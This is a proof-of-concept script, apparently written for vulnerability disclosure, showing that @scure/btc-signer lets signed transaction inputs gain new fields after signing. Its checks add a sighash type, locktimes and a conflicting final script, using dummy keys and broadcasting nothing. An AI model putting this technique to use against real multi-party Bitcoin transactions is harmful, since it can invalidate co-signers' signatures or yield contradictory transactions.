/**
 * PoC: mergeKeyMap's cannotChange guard only fires when the field already
 * exists, so signed inputs can GAIN previously-absent fields (sighashType,
 * requiredTimeLocktime, requiredHeightLocktime, ...), invalidating existing
 * signatures or creating contradictory final state.
 *
 * Target: @scure/btc-signer @ 68b2fad4ef8232302c6239c00902def1f511c974
 * Safety: generated valueless keys only; nothing broadcast.
 * Run: BTC_SIGNER_DIR=/path/to/worktree node --no-warnings poc.ts  (node >= 20.19)
 */
const W = process.env.BTC_SIGNER_DIR || '/w';
const { hex } = await import(W + '/node_modules/@scure/base/index.js');
const { Transaction, SigHash } = await import(W + '/src/transaction.ts');
const { p2wpkh } = await import(W + '/src/payment.ts');
const { pubECDSA } = await import(W + '/src/utils.ts');

const b = (s: string) => hex.decode(s);
let failed = 0;
const check = (name: string, cond: boolean) => {
  console.log((cond ? 'ok  ' : 'FAIL') + ' ' + name);
  if (!cond) failed++;
};

const priv = b('01'.repeat(32));
const wpkh = p2wpkh(pubECDSA(priv));
function freshSigned() {
  const tx = new Transaction();
  tx.addInput({ txid: b('11'.repeat(32)), index: 0, witnessUtxo: { amount: 100000n, script: wpkh.script } });
  tx.addOutput({ amount: 90000n, script: b('0014' + '33'.repeat(20)) });
  if (!tx.signIdx(priv, 0)) throw new Error('sign failed');
  return tx;
}

// 1. add sighashType post-sign
{
  const tx = freshSigned();
  tx.updateInput(0, { sighashType: SigHash.NONE });
  check('post-sign ADD sighashType (was absent) ACCEPTED', tx.getInput(0).sighashType === SigHash.NONE);
}

// 2. add requiredTimeLocktime post-sign -> lockTime flips -> existing sig invalid
{
  const tx = freshSigned();
  const lt0 = tx.lockTime;
  tx.updateInput(0, { requiredTimeLocktime: 500000000 });
  const ltAfter = tx.lockTime; // cleanFinalInput would wipe the field; capture before finalize
  tx.finalizeIdx(0);
  const raw = tx.extract();
  check(`post-sign ADD requiredTimeLocktime ACCEPTED; lockTime ${lt0} -> ${ltAfter}; extract ok but sig stale`,
    lt0 === 0 && ltAfter === 500000000 && raw.length > 0);
}

// 3. add requiredHeightLocktime post-sign
{
  const tx = freshSigned();
  tx.updateInput(0, { requiredHeightLocktime: 800000 });
  check('post-sign ADD requiredHeightLocktime ACCEPTED; lockTime=' + tx.lockTime, tx.lockTime === 800000);
}

// 4. finalized input gains finalScriptSig alongside finalScriptWitness; extract serializes both
{
  const tx = freshSigned();
  tx.finalizeIdx(0);
  tx.updateInput(0, { finalScriptSig: b('51') });
  const inp = tx.getInput(0);
  const both = !!inp.finalScriptSig?.length && !!inp.finalScriptWitness?.length;
  const raw = tx.extract();
  check('finalized input gained finalScriptSig ALONGSIDE finalScriptWitness; extract emitted both', both && raw.length > 0);
}

// 5. protections that DO hold
{
  const tx = freshSigned();
  let threw1 = false, threw2 = false, threw3 = false;
  try { tx.updateInput(0, { witnessUtxo: { amount: 1n, script: wpkh.script } }); } catch { threw1 = true; }
  try { tx.updateInput(0, { sequence: 0 }); } catch { threw2 = true; }
  tx.updateInput(0, { bip32Derivation: [[pubECDSA(priv), { fingerprint: 0x12345678, path: [0x80000000] }]] });
  try { tx.updateInput(0, { bip32Derivation: [[pubECDSA(priv), { fingerprint: 0x87654321, path: [0x80000000] }]] }); } catch { threw3 = true; }
  check('post-sign CHANGE witnessUtxo / sequence / same-key keyed conflict all REJECTED', threw1 && threw2 && threw3);
}

process.exit(failed ? 1 : 0);
